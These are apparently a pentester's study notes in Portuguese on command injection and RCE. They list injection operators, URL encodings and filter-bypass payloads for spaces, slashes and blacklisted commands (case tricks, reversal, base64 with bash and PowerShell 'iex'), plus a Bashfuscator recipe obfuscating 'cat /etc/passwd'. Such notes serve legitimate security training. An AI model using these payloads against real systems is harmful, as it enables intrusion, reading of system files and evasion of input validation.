# RCE & Command Injection

- **RCE**
    
    Encontrar requests com hidden parameters (da pra ver se eh hidden pelo source-code) (ex: pdf generator que não especificamos na geração pra ele gerar mas ele gera de acordo com os parametros que ja tinha e que vão no request como hidden), interceptar e tentar inserir comandos nos valores do parâmetros (procurar por payloads), ex: **`name=alex$whoami`**, se for blind podemos tentar inserir uma reverse shell na linguagem da aplicação, e tentar URL encodar até 2vezes se não tive dando certo..
    

---

- **Command Injections**
    - Pode ser POST ou GET, contanto que ao ser GET retorne um output na tela (procurar por output na tela, principalmente que ao inserir um comando malicioso nos retorne que foi invalido/bloqueado, pois poderemos explorar sabendo do resultado).
    - SEMPRE entender a aplicacao (principalmente se tiver + de 1 variavel no request para o mesmo comando)
    - **TENTAR MUDAR Request Method (olhar modulo abaixo de HTTP Verb para entender e testar)**
    - SE FOR **BLIND**, investigar usando `ping` ou `sleep` , pois assim colocamos um delay no comando e vemos se o payload deu certo e o delay acontecerá. (usar `timeout` caso seja windows)
    - **Bypassing Character/Operator Filters**
        
        
        | **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
        | --- | --- | --- | --- |
        | Semicolon | `;` | `%3b` | Both |
        | New Line | `\n` | **`%0a`** | Both |
        | Background | `&` | `%26` | Both (second output generally shown first) |
        | Pipe | `|` | `%7c` | Both (only second output is shown) |
        | AND | `&&` | `%26%26` | Both (only if first succeeds) |
        | OR | `||` | `%7c%7c` | Second (only if first fails) |
        | Sub-Shell | ```` | `%60%60` | Both (Linux-only) |
        | Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |
        - **OBS**: Bypassing de semicolon → **`${LS_COLORS:10:1}`** (se quiser entender, ler abaixo o **`Bypassing SLASH Filters`**)
        - **SEMPRE usar URL enconding**
        - Dando erro, tbm checar sempre se a validacao eh feita no frontend (pode ser que seja apenas no front), se sim, interceptar com burp ou retirar validacao no inspect.
    
    ---
    
    - **Identifying Filters**
        - A aplicacao tambem pode fazer a validacao usando blacklist, tanto para caracteres (Ex: **`&`**,**`;`**,**`|`**), ou tambem para os proprios comandos (Ex: **`whoami`**..). Podemos entao testar os dois de forma isolada para ver qual que esta sendo bloqueado (ou os dois).
        - **Resumo** → antes de comecar a explorar com comandos diretos, inserir os caracteres (na maioria com URL encoded) e ver qual eh validado ou nao.
        - **OBS:** normalmente a **`new-line`** nao eh bloqueada por blacklist, pois muitas vezes eh necessaria no proprio payload/codigo legitimo.
    - **Bypassing `SPACE` Filters**
        - Testar se o espaco eh permitido (**`+`**) de forma isolada, sendo bloqueado:
        - Testar **Tabs  →  `%09`**
        - Testar **IFS → `${IFS}`**
        - Testar **Brace Expansion** (**`127.0.0.1%0a{ls,-la}`**) que reconhece como espaco onde tiver **`,`**.
        - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection#bypass-without-space](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
    - **Bypassing `SLASH`  Filters**
        - Sabemos que ao usar o comando $PATH ele mostra diretorios, e o primeiro caracter mostrado no output eh uma barra, entao podemos usar isso para selecionar e usar a barra:
        - **`${PATH:0:1}`**
        - Ou tambem selecionar ele pela ascii:
        - **`$(tr '!-}' '"-~'<<<[)`**
        
        ---
        
        - Se for **Windows**:
        - **CMD → `%HOMEPATH:~6,-11%`**
        - **Powershell → `HOMEPATH[0]`**
    - **Bypassing `Commands` Filters**
        - Ex: **`whoami`**
        - Testar **single/double quotes** em algumas letras **(TEM QUE SER PAR)** →  **`w'h'o'am'i`**   ou   **`w"h"o"am"i`**
        - Testar **`$@`** ou **`/`** no meio da palavra  → **`who$@ami`**
        
        ---
        
        - **Windows:**
            - Testar **`^`** no meio da palavra →  **`who^ami`**
    - **Se bypass de commands normal nao resolver:**
    - **Bypassing Advanced`Commands` Filters**
        - **Ex: `whoami`**
        1. Testar **Alternar Case** (esse comando tem espacos, entao usamos o bypass que descobrismos  anteriormente para subsitui-los, Ex: **`%09`**) → **`$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")`** 
            
            **ou** 
            **`$(a="WhOaMi";printf%09%s%09"${a,,}")`**
            
            **OBS: esse comando tem `;` e outros caracteres que tambem podem estar sendo filtrados alem do espaco, se for o caso trocar eles pelo do bypass.**
            
        2. Testar **Reverse Commands → `$(rev<<<'imaohw')`**
        3. Testar **Encoded Commands →** primeiro encodamos o comando no nosso terminal: **`echo -n 'whoami' | base64`**  
            
            pegamos o resultado e:
            
            **`bash<<<$(base64 -d<<<[BASE_64])`** 
            
            **TROCAR ESPACO POR `%09`  ACIMA**
            
            (se a palavra base64 por bloqueada, podemos fazer bypass nela (topico acima))
            
        
        ---
        
        - <u>**Windows</u>:**
            1. **Alternar Case →  `WhOaMi`**
            2. **Reverse commands → 
            `iex "$('imaohw'[-1..-20] -join '')"`**
            3. **Testar Encoded Commands →** primeiro encodamos o comando no nosso terminal Linux: 
            **`echo -n whoami | iconv -f utf-8 -t utf-16le | base64`**
                
                pegamos o resultado e:
                
                ```powershell
                iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('[BASE_64]')))"
                ```
                
                (se a palavra base64 por bloqueada, podemos fazer bypass nela (topico acima))
                
    
    (OBS: as vezes o filtro eh mto simples e podemos simplesmente testar varios payloads de revshell sem ficar ajustando todos)
    
    ---
    
    - **Tools para Payload**
        - <u>**Linux (Bashfuscator):**</u>
            - Baixar:
            
            ```bash
            git clone https://github.com/Bashfuscator/Bashfuscator
            
            cd Bashfuscator
            pip3 install setuptools==65
            python3 setup.py install --user
            ```
            
            - Rodar:
            
            ```bash
            cd ./bashfuscator/bin/
            
            # Podemos gerar o payload padrao:
            ./bashfuscator -c 'cat /etc/passwd'
            # OU podemos gerar ele menor:
            ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
            ```
            
            - Agora para rodar o payload pro site → **`bash 'c "[RESULTADO_PAYLOAD]"'`**
                
                (trocar espacos pelo bypass, tanto no codigo acima quanto no payload gerado (ver opcoes da ferramenta p isso))
                
        
        ---
        
        - <u>**Windows:**</u>
            - ([https://academy.hackthebox.com/module/109/section/1040](https://academy.hackthebox.com/module/109/section/1040))
    
    ---
